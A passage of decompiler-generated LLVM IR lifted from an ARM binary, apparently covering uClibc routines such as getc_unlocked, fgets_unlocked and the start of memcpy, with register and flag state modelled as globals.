  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 54, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 53, 19, 20, 21, 22, 23, 24, 26, 25, 55, 27, 28, 29, 30, 32, 31, 50, 33, 34, 35, 36, 38, 37, 51, 39, 40, 41, 42, 44, 43, 52, 45, 46, 49, 47, 48 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 11, 1, 2, 3, 37, 38, 4, 5, 6, 7, 8, 34, 35, 9, 10, 36, 12, 13, 14, 39, 40, 15, 16, 17, 28, 29, 18, 19, 20, 21, 30, 31, 22, 23, 24, 32, 33, 25, 26, 27 }
  uselistorder i32 92, { 0, 1, 2, 6, 3, 4, 7, 5, 8 }
  uselistorder i32 152, { 1, 3, 2, 4, 5, 8, 6, 9, 7, 10, 0, 11, 12, 14, 13, 15, 18, 16, 19, 17, 20, 22, 21, 23 }
  uselistorder i32 129, { 7, 8, 9, 5, 6, 10, 11, 0, 1, 2, 3, 4, 13, 14, 12 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 32, 33 }
  uselistorder i32 -61441, { 16, 17, 18, 19, 20, 21, 12, 13, 14, 15, 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 32, 26, 27, 28, 29, 30, 31 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_17e24, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_17dfc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17de4, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17d64, { 1, 0 }
  uselistorder label %dec_label_pc_17d58, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_17d48, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17d30, { 1, 0 }
  uselistorder label %dec_label_pc_17cec, { 1, 0 }
  uselistorder label %dec_label_pc_17cdcthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_17cb4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17c9c, { 1, 0 }
  uselistorder label %dec_label_pc_17c5c, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_17c4c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17c34, { 1, 0 }
  uselistorder label %dec_label_pc_17c08, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17be0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17bc8, { 1, 0 }
  uselistorder label %dec_label_pc_17b80, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_17b70, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17b58, { 1, 0 }
  uselistorder label %dec_label_pc_17b24, { 1, 0 }
}

define i32 @function_17e80(i32 %arg1) local_unnamed_addr {
dec_label_pc_17e80:
  %v0_17e80 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17e80, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17e80
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_17e80, %bb
  %v10_17e90 = phi i32 [ %arg1, %dec_label_pc_17e80 ], [ 0, %bb ]
  ret i32 %v10_17e90

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_17e94 = load i32, i32* @r4, align 4
  store i32 %v3_17e94, i32* %stack_var_-12, align 4
  %v6_17e94 = load i32, i32* @r5, align 4
  %v9_17e94 = load i32, i32* @lr, align 4
  %v0_17e98 = load i32, i32* @r0, align 4
  %v1_17e98 = add i32 %v0_17e98, 16
  %v2_17e98 = inttoptr i32 %v1_17e98 to i32*
  %v3_17e98 = load i32, i32* %v2_17e98, align 4
  store i32 %v3_17e98, i32* %r2.global-to-local, align 4
  %v1_17e9c = add i32 %v0_17e98, 24
  %v2_17e9c = inttoptr i32 %v1_17e9c to i32*
  %v3_17e9c = load i32, i32* %v2_17e9c, align 4
  %v3_17ea0 = icmp ult i32 %v3_17e98, %v3_17e9c
  store i32 %v0_17e98, i32* @r4, align 4
  br i1 %v3_17ea0, label %bb, label %dec_label_pc_17ec0

bb:                                               ; preds = %entry
  %v2_17eac = inttoptr i32 %v3_17e98 to i8*
  %v3_17eac = load i8, i8* %v2_17eac, align 1
  %v4_17eac = zext i8 %v3_17eac to i32
  store i32 %v4_17eac, i32* %r0.global-to-local, align 4
  %v6_17eac = add i32 %v3_17e98, 1
  store i32 %v6_17eac, i32* %r2.global-to-local, align 4
  store i32 %v6_17eac, i32* %v2_17e98, align 4
  br label %dec_label_pc_17fac

dec_label_pc_17ec0:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* @r5, align 4
  %v1_17ec0 = inttoptr i32 %v0_17e98 to i16*
  %v2_17ec0 = load i16, i16* %v1_17ec0, align 2
  %v3_17ec0 = zext i16 %v2_17ec0 to i32
  %v1_17ec4 = and i32 %v3_17ec0, 131
  %tmp25 = icmp ugt i32 %v1_17ec4, 128
  br i1 %tmp25, label %dec_label_pc_17ee0, label %dec_label_pc_17ed0

dec_label_pc_17ed0:                               ; preds = %dec_label_pc_17ec0
  store i32 128, i32* @r1, align 4
  %v0_17ed4 = call i32 @__stdio_trans2r_o()
  store i32 %v0_17ed4, i32* %r0.global-to-local, align 4
  %v2_17ed8 = icmp eq i32 %v0_17ed4, 0
  br i1 %v2_17ed8, label %dec_label_pc_17ed0.dec_label_pc_17ee0_crit_edge, label %dec_label_pc_17fa8

dec_label_pc_17ed0.dec_label_pc_17ee0_crit_edge:  ; preds = %dec_label_pc_17ed0
  %v0_17ee0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17ee0

dec_label_pc_17ee0:                               ; preds = %dec_label_pc_17ed0.dec_label_pc_17ee0_crit_edge, %dec_label_pc_17ec0
  %v2_17f20 = phi i32 [ %v0_17ee0.pre, %dec_label_pc_17ed0.dec_label_pc_17ee0_crit_edge ], [ %v0_17e98, %dec_label_pc_17ec0 ]
  %v1_17ee0 = inttoptr i32 %v2_17f20 to i16*
  %v2_17ee0 = load i16, i16* %v1_17ee0, align 2
  %v3_17ee0 = zext i16 %v2_17ee0 to i32
  store i32 %v3_17ee0, i32* %r2.global-to-local, align 4
  %v1_17ee4 = and i32 %v3_17ee0, 2
  %v2_17ee4 = icmp eq i32 %v1_17ee4, 0
  br i1 %v2_17ee4, label %dec_label_pc_17f10, label %dec_label_pc_17eec

dec_label_pc_17eec:                               ; preds = %dec_label_pc_17ee0
  %tmp26 = urem i16 %v2_17ee0, 2
  %v1_17eec = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_17eec
  %v4_17ef0 = and i32 %tmp22, 4
  %v5_17ef0 = add i32 %v4_17ef0, %v2_17f20
  %v1_17ef4 = add i32 %v5_17ef0, 36
  %v2_17ef4 = inttoptr i32 %v1_17ef4 to i8*
  %v3_17ef4 = load i8, i8* %v2_17ef4, align 1
  %v4_17ef4 = zext i8 %v3_17ef4 to i32
  %v1_17ef8 = add nsw i32 %v3_17ee0, -1
  store i32 %v1_17ef8, i32* %r2.global-to-local, align 4
  store i32 %v4_17ef4, i32* %r0.global-to-local, align 4
  %v2_17f04 = add i32 %v2_17f20, 40
  %v3_17f04 = inttoptr i32 %v2_17f04 to i32*
  store i32 0, i32* %v3_17f04, align 4
  %v0_17f08 = load i32, i32* %r2.global-to-local, align 4
  %v1_17f08 = trunc i32 %v0_17f08 to i16
  %v2_17f08 = load i32, i32* @r4, align 4
  %v3_17f08 = inttoptr i32 %v2_17f08 to i16*
  store i16 %v1_17f08, i16* %v3_17f08, align 2
  br label %dec_label_pc_17fac

dec_label_pc_17f10:                               ; preds = %dec_label_pc_17ee0
  %v1_17f10 = add i32 %v2_17f20, 16
  %v1_17f14 = inttoptr i32 %v1_17f10 to i32*
  %v2_17f14 = load i32, i32* %v1_17f14, align 4
  store i32 %v2_17f14, i32* @r1, align 4
  %v3_17f14 = add i32 %v2_17f20, 20
  %v4_17f14 = inttoptr i32 %v3_17f14 to i32*
  %v5_17f14 = load i32, i32* %v4_17f14, align 4
  %v9_17f18 = icmp eq i32 %v5_17f14, %v2_17f14
  br i1 %v9_17f18, label %dec_label_pc_17f28, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17f10
  %v2_17f1c = inttoptr i32 %v2_17f14 to i8*
  %v3_17f1c = load i8, i8* %v2_17f1c, align 1
  %v4_17f1c = zext i8 %v3_17f1c to i32
  store i32 %v4_17f1c, i32* %r0.global-to-local, align 4
  %v6_17f1c = add i32 %v2_17f14, 1
  store i32 %v6_17f1c, i32* @r1, align 4
  store i32 %v6_17f1c, i32* %v1_17f14, align 4
  br label %dec_label_pc_17fac

dec_label_pc_17f28:                               ; preds = %dec_label_pc_17f10
  %v1_17f28 = add i32 %v2_17f20, 4
  %v2_17f28 = inttoptr i32 %v1_17f28 to i32*
  %v3_17f28 = load i32, i32* %v2_17f28, align 4
  %v7_17f2c = icmp eq i32 %v3_17f28, -2
  br i1 %v7_17f2c, label %.thread7, label %dec_label_pc_17f40

.thread7:                                         ; preds = %dec_label_pc_17f28
  %v2_17f30 = or i16 %v2_17ee0, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_17f30, i16* %v1_17ee0, align 2
  br label %dec_label_pc_17fac

dec_label_pc_17f40:                               ; preds = %dec_label_pc_17f28
  %v1_17f40 = and i32 %v3_17ee0, 768
  %v2_17f40 = icmp eq i32 %v1_17f40, 0
  br i1 %v2_17f40, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_17f40
  %v1_17f48 = load i32, i32* @r5, align 4
  %v3_17f48 = add i32 %v1_17f48, 76
  %v4_17f48 = inttoptr i32 %v3_17f48 to i32*
  %v5_17f48 = load i32, i32* %v4_17f48, align 4
  store i32 %v5_17f48, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_17f40, %bb23
  store i32 98128, i32* @lr, align 4
  %v1_17f4c = xor i1 %v2_17f40, true
  call void @__pseudo_cond_branch(i1 %v1_17f4c, i32 ptrtoint (i32* @global_var_17ae8.619 to i32))
  %v0_17f50 = load i32, i32* @r4, align 4
  %v1_17f50 = add i32 %v0_17f50, 8
  store i32 %v1_17f50, i32* %r2.global-to-local, align 4
  %v1_17f54 = inttoptr i32 %v1_17f50 to i32*
  %v2_17f54 = load i32, i32* %v1_17f54, align 4
  store i32 %v2_17f54, i32* %r2.global-to-local, align 4
  %v3_17f54 = add i32 %v0_17f50, 12
  %v4_17f54 = inttoptr i32 %v3_17f54 to i32*
  %v5_17f54 = load i32, i32* %v4_17f54, align 4
  %v9_17f58 = icmp eq i32 %v5_17f54, %v2_17f54
  br i1 %v9_17f58, label %dec_label_pc_17f8c, label %dec_label_pc_17f60

dec_label_pc_17f60:                               ; preds = %.thread9
  %v2_17f60 = add i32 %v0_17f50, 24
  %v3_17f60 = inttoptr i32 %v2_17f60 to i32*
  store i32 %v2_17f54, i32* %v3_17f60, align 4
  %v0_17f64 = load i32, i32* @r4, align 4
  store i32 %v0_17f64, i32* %r0.global-to-local, align 4
  %v2_17f68 = call i32 @__stdio_rfill(i32 %v0_17f64)
  store i32 %v2_17f68, i32* %r0.global-to-local, align 4
  %v2_17f6c = icmp eq i32 %v2_17f68, 0
  br i1 %v2_17f6c, label %dec_label_pc_17fa8, label %dec_label_pc_17f74

dec_label_pc_17f74:                               ; preds = %dec_label_pc_17f60
  %v0_17f74 = load i32, i32* @r4, align 4
  %v1_17f74 = add i32 %v0_17f74, 20
  %v2_17f74 = inttoptr i32 %v1_17f74 to i32*
  %v3_17f74 = load i32, i32* %v2_17f74, align 4
  %v2_17f78 = add i32 %v0_17f74, 24
  %v3_17f78 = inttoptr i32 %v2_17f78 to i32*
  store i32 %v3_17f74, i32* %v3_17f78, align 4
  %v0_17f7c = load i32, i32* @r4, align 4
  %v1_17f7c = add i32 %v0_17f7c, 16
  %v2_17f7c = inttoptr i32 %v1_17f7c to i32*
  %v3_17f7c = load i32, i32* %v2_17f7c, align 4
  %v1_17f80 = inttoptr i32 %v3_17f7c to i8*
  %v2_17f80 = load i8, i8* %v1_17f80, align 1
  %v3_17f80 = zext i8 %v2_17f80 to i32
  store i32 %v3_17f80, i32* %r0.global-to-local, align 4
  %v5_17f80 = add i32 %v3_17f7c, 1
  store i32 %v5_17f80, i32* %v2_17f7c, align 4
  br label %dec_label_pc_17fac

dec_label_pc_17f8c:                               ; preds = %.thread9
  %v1_17f8c = inttoptr i32 %v0_17f50 to i16*
  store i32 %v0_17f50, i32* %r0.global-to-local, align 4
  %v2_17f90 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_17f90, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_17f98 = call i32 @__stdio_READ(i16* %v1_17f8c, i32 %v2_17f90, i32 1)
  store i32 %v5_17f98, i32* %r0.global-to-local, align 4
  %v2_17f9c = icmp eq i32 %v5_17f98, 0
  br i1 %v2_17f9c, label %dec_label_pc_17fa8, label %bb24

bb24:                                             ; preds = %dec_label_pc_17f8c
  %v4_17fa0 = load i8, i8* %stack_var_-17, align 1
  %v5_17fa0 = sext i8 %v4_17fa0 to i32
  store i32 %v5_17fa0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17fac

dec_label_pc_17fa8:                               ; preds = %dec_label_pc_17f8c, %dec_label_pc_17ed0, %dec_label_pc_17f60
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17fac

dec_label_pc_17fac:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_17f74, %dec_label_pc_17eec, %dec_label_pc_17fa8
  %v2_17fb0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17fb0, i32* @r4, align 4
  store i32 %v6_17e94, i32* @r5, align 4
  store i32 %v9_17e94, i32* @lr, align 4
  %v1_17fb4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_17fb4

; uselistorder directives
  uselistorder i32 %v2_17f14, { 1, 0, 2, 3 }
  uselistorder i32 %v2_17f20, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_17e98, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i32 768, { 2, 0, 3, 1, 4 }
  uselistorder i32 131, { 2, 0, 3, 1, 4 }
  uselistorder label %dec_label_pc_17fac, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_17fa8, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_17fc0 = load i32, i32* @r6, align 4
  %v12_17fc0 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17fc4 = icmp eq i32 %arg2, 0
  store i1 %v2_17fc4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_1804c, label %dec_label_pc_18034.preheader

dec_label_pc_18034.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_180342 = add i32 %arg2, -1
  store i32 %v1_180342, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_180348 = icmp eq i32 %arg2, 1
  store i1 %v7_180348, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_180348, label %dec_label_pc_1803c, label %dec_label_pc_17fe0

dec_label_pc_17fe0:                               ; preds = %dec_label_pc_18034.preheader, %dec_label_pc_18034.backedge.dec_label_pc_17fe0_crit_edge
  %v0_18004 = phi i32 [ %v0_17fe0.pre, %dec_label_pc_18034.backedge.dec_label_pc_17fe0_crit_edge ], [ %arg3, %dec_label_pc_18034.preheader ]
  %v1_17fe0 = add i32 %v0_18004, 16
  %v2_17fe0 = inttoptr i32 %v1_17fe0 to i32*
  %v3_17fe0 = load i32, i32* %v2_17fe0, align 4
  store i32 %v3_17fe0, i32* %r2.global-to-local, align 4
  %v1_17fe4 = add i32 %v0_18004, 24
  %v2_17fe4 = inttoptr i32 %v1_17fe4 to i32*
  %v3_17fe4 = load i32, i32* %v2_17fe4, align 4
  store i32 %v3_17fe4, i32* %r3.global-to-local, align 4
  %v3_17fe8 = icmp uge i32 %v3_17fe0, %v3_17fe4
  store i1 %v3_17fe8, i1* %cpsr_c.global-to-local, align 1
  %v9_17fe8 = icmp eq i32 %v3_17fe0, %v3_17fe4
  store i1 %v9_17fe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17fe8, label %dec_label_pc_18004, label %dec_label_pc_17ff0

dec_label_pc_17ff0:                               ; preds = %dec_label_pc_17fe0
  %v1_17ff0 = inttoptr i32 %v3_17fe0 to i8*
  %v2_17ff0 = load i8, i8* %v1_17ff0, align 1
  %v3_17ff0 = zext i8 %v2_17ff0 to i32
  store i32 %v3_17ff0, i32* %r3.global-to-local, align 4
  %v5_17ff0 = add i32 %v3_17fe0, 1
  store i32 %v5_17ff0, i32* %r2.global-to-local, align 4
  %v2_17ff4 = load i32, i32* @r5, align 4
  %v3_17ff4 = inttoptr i32 %v2_17ff4 to i8*
  store i8 %v2_17ff0, i8* %v3_17ff4, align 1
  %v4_17ff4 = load i32, i32* @r5, align 4
  %v5_17ff4 = add i32 %v4_17ff4, 1
  store i32 %v5_17ff4, i32* @r5, align 4
  %v0_17ff8 = load i32, i32* %r3.global-to-local, align 4
  %v2_17ff8 = icmp ugt i32 %v0_17ff8, 9
  store i1 %v2_17ff8, i1* %cpsr_c.global-to-local, align 1
  %v7_17ff8 = icmp eq i32 %v0_17ff8, 10
  store i1 %v7_17ff8, i1* %cpsr_z.global-to-local, align 1
  %v0_17ffc = load i32, i32* %r2.global-to-local, align 4
  %v1_17ffc = load i32, i32* @r4, align 4
  %v2_17ffc = add i32 %v1_17ffc, 16
  %v3_17ffc = inttoptr i32 %v2_17ffc to i32*
  store i32 %v0_17ffc, i32* %v3_17ffc, align 4
  br i1 %v7_17ff8, label %dec_label_pc_1803c, label %dec_label_pc_18034.backedge

dec_label_pc_18004:                               ; preds = %dec_label_pc_17fe0
  %v1_18004 = inttoptr i32 %v0_18004 to i16*
  %v3_18008 = call i32 @getc_unlocked(i16* %v1_18004)
  %v3_1800c = icmp eq i32 %v3_18008, -1
  store i1 %v3_1800c, i1* %cpsr_c.global-to-local, align 1
  %v8_1800c = icmp eq i32 %v3_18008, -1
  store i1 %v8_1800c, i1* %cpsr_z.global-to-local, align 1
  %v1_18010 = urem i32 %v3_18008, 256
  store i32 %v1_18010, i32* %r3.global-to-local, align 4
  br i1 %v3_1800c, label %dec_label_pc_18018, label %dec_label_pc_18030

dec_label_pc_18018:                               ; preds = %dec_label_pc_18004
  %v0_18018 = load i32, i32* @r4, align 4
  %v1_18018 = inttoptr i32 %v0_18018 to i16*
  %v2_18018 = load i16, i16* %v1_18018, align 2
  %v3_18018 = zext i16 %v2_18018 to i32
  store i32 %v3_18018, i32* %r3.global-to-local, align 4
  %v1_1801c = and i32 %v3_18018, 8
  %v2_1801c = icmp eq i32 %v1_1801c, 0
  store i1 %v2_1801c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1801c, label %dec_label_pc_1803c, label %dec_label_pc_1804c

dec_label_pc_18030:                               ; preds = %dec_label_pc_18004
  %v1_18028 = trunc i32 %v3_18008 to i8
  %v2_18028 = load i32, i32* @r5, align 4
  %v3_18028 = inttoptr i32 %v2_18028 to i8*
  store i8 %v1_18028, i8* %v3_18028, align 1
  %v4_18028 = load i32, i32* @r5, align 4
  %v5_18028 = add i32 %v4_18028, 1
  store i32 %v5_18028, i32* @r5, align 4
  %v0_1802c = load i32, i32* %r3.global-to-local, align 4
  %v2_1802c = icmp ugt i32 %v0_1802c, 9
  store i1 %v2_1802c, i1* %cpsr_c.global-to-local, align 1
  %v7_1802c = icmp eq i32 %v0_1802c, 10
  store i1 %v7_1802c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1802c, label %dec_label_pc_1803c, label %dec_label_pc_18034.backedge

dec_label_pc_18034.backedge:                      ; preds = %dec_label_pc_18030, %dec_label_pc_17ff0
  %v0_18034 = load i32, i32* @r6, align 4
  %v1_18034 = add i32 %v0_18034, -1
  store i32 %v1_18034, i32* @r6, align 4
  %v2_18034 = icmp ne i32 %v0_18034, 0
  store i1 %v2_18034, i1* %cpsr_c.global-to-local, align 1
  %v7_18034 = icmp eq i32 %v0_18034, 1
  store i1 %v7_18034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18034, label %dec_label_pc_1803c, label %dec_label_pc_18034.backedge.dec_label_pc_17fe0_crit_edge

dec_label_pc_18034.backedge.dec_label_pc_17fe0_crit_edge: ; preds = %dec_label_pc_18034.backedge
  %v0_17fe0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17fe0

dec_label_pc_1803c:                               ; preds = %dec_label_pc_18030, %dec_label_pc_18034.backedge, %dec_label_pc_17ff0, %dec_label_pc_18034.preheader, %dec_label_pc_18018
  %v0_1803c = load i32, i32* @r5, align 4
  %v1_1803c = load i32, i32* @r7, align 4
  %v3_1803c = icmp uge i32 %v0_1803c, %v1_1803c
  store i1 %v3_1803c, i1* %cpsr_c.global-to-local, align 1
  %v9_1803c = icmp eq i32 %v0_1803c, %v1_1803c
  store i1 %v9_1803c, i1* %cpsr_z.global-to-local, align 1
  %v2_18040 = xor i1 %v9_1803c, true
  %v3_18040 = and i1 %v3_1803c, %v2_18040
  br i1 %v3_18040, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_1803c
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_18044 = inttoptr i32 %v0_1803c to i8*
  store i8 0, i8* %v7_18044, align 1
  %v0_18048.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_18048.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_1803c, %bb
  %v1_18048 = phi i1 [ %v1_18048.pre, %bb ], [ %v9_1803c, %dec_label_pc_1803c ]
  %v0_18048 = phi i1 [ %v0_18048.pre, %bb ], [ %v3_1803c, %dec_label_pc_1803c ]
  %v2_18048 = xor i1 %v1_18048, true
  %v3_18048 = and i1 %v0_18048, %v2_18048
  br i1 %v3_18048, label %.dec_label_pc_18050_crit_edge, label %dec_label_pc_1804c

.dec_label_pc_18050_crit_edge:                    ; preds = %.thread14
  %v0_18050.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18050

dec_label_pc_1804c:                               ; preds = %entry, %dec_label_pc_18018, %.thread14
  br label %dec_label_pc_18050

dec_label_pc_18050:                               ; preds = %.dec_label_pc_18050_crit_edge, %dec_label_pc_1804c
  %v0_18050 = phi i32 [ %v0_18050.pre, %.dec_label_pc_18050_crit_edge ], [ 0, %dec_label_pc_1804c ]
  store i32 %v9_17fc0, i32* @r6, align 4
  store i32 %v12_17fc0, i32* @r7, align 4
  ret i32 %v0_18050

; uselistorder directives
  uselistorder i1 %v9_1803c, { 1, 0, 2 }
  uselistorder i32 %v1_1803c, { 1, 0 }
  uselistorder i32 %v0_1803c, { 0, 2, 1 }
  uselistorder i32 %v0_18034, { 2, 0, 1 }
  uselistorder i32 %v0_1802c, { 1, 0 }
  uselistorder i32 %v3_18008, { 2, 1, 0, 3 }
  uselistorder i32 %v0_17ff8, { 1, 0 }
  uselistorder i32 %v3_17fe0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_18004, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_18050, { 1, 0 }
  uselistorder label %dec_label_pc_1804c, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_1803c, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_17fe0, { 1, 0 }
}

define i32 @_memcpy() local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_18060 = load i32, i32* @r1, align 4
  %v1_18060 = load i32, i32* @r0, align 4
  %v2_18060 = sub i32 %v0_18060, %v1_18060
  %v3_18060 = icmp ult i32 %v0_18060, %v1_18060
  %v4_18060 = xor i32 %v1_18060, %v0_18060
  %v5_18060 = xor i32 %v2_18060, %v0_18060
  %v6_18060 = and i32 %v5_18060, %v4_18060
  %v7_18060 = icmp slt i32 %v6_18060, 0
  store i1 %v7_18060, i1* %cpsr_v.global-to-local, align 1
  %v8_18060 = icmp slt i32 %v2_18060, 0
  store i1 %v8_18060, i1* %cpsr_n.global-to-local, align 1
  %v9_18060 = icmp eq i32 %v0_18060, %v1_18060
  store i1 %v9_18060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18060, label %dec_label_pc_182b4, label %dec_label_pc_18068

dec_label_pc_18068:                               ; preds = %entry
  br i1 %v9_18060, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_18068
  %merge = phi i32 [ %v0_18060, %dec_label_pc_18068 ], [ %v2_18348, %bb150 ], [ %v11_18364, %bb153 ], [ %v7_18364, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_18068
  %v5_1806c = inttoptr i32 %v1_18060 to i8*
  store i8* %v5_1806c, i8** %stack_var_-8, align 4
  %v8_1806c = load i32, i32* @lr, align 4
  %v0_18070 = load i32, i32* @r2, align 4
  %v2_18070 = add i32 %v0_18070, -4
  store i32 %v2_18070, i32* %r2.global-to-local, align 4
  %v4_18070 = sub i32 3, %v0_18070
  %v5_18070 = and i32 %v4_18070, %v0_18070
  %v6_18070 = icmp slt i32 %v5_18070, 0
  store i1 %v6_18070, i1* %cpsr_v.global-to-local, align 1
  %v7_18070 = icmp slt i32 %v2_18070, 0
  store i1 %v7_18070, i1* %cpsr_n.global-to-local, align 1
  %v8_18070 = icmp eq i32 %v0_18070, 4
  store i1 %v8_18070, i1* %cpsr_z.global-to-local, align 1
  %v5_18074 = icmp slt i32 %v0_18070, 4
  br i1 %v5_18074, label %bb140, label %dec_label_pc_18078

dec_label_pc_18078:                               ; preds = %bb
  %v1_18078 = urem i32 %v1_18060, 4
  store i32 %v1_18078, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18078 = icmp eq i32 %v1_18078, 0
  store i1 %v2_18078, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18078, label %dec_label_pc_18080, label %dec_label_pc_1812c

dec_label_pc_18080:                               ; preds = %dec_label_pc_18078
  %v1_18080 = urem i32 %v0_18060, 4
  store i32 %v1_18080, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18080 = icmp eq i32 %v1_18080, 0
  store i1 %v2_18080, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_18060 to i2
  br i1 %v2_18080, label %dec_label_pc_18088, label %dec_label_pc_1815c

dec_label_pc_18088:                               ; preds = %dec_label_pc_18080, %dec_label_pc_18154
  %v0_180a094 = phi i32 [ %v1_18060, %dec_label_pc_18080 ], [ %v0_1827c77, %dec_label_pc_18154 ]
  %v0_1809c93 = phi i32 [ %v0_18060, %dec_label_pc_18080 ], [ %v0_18154, %dec_label_pc_18154 ]
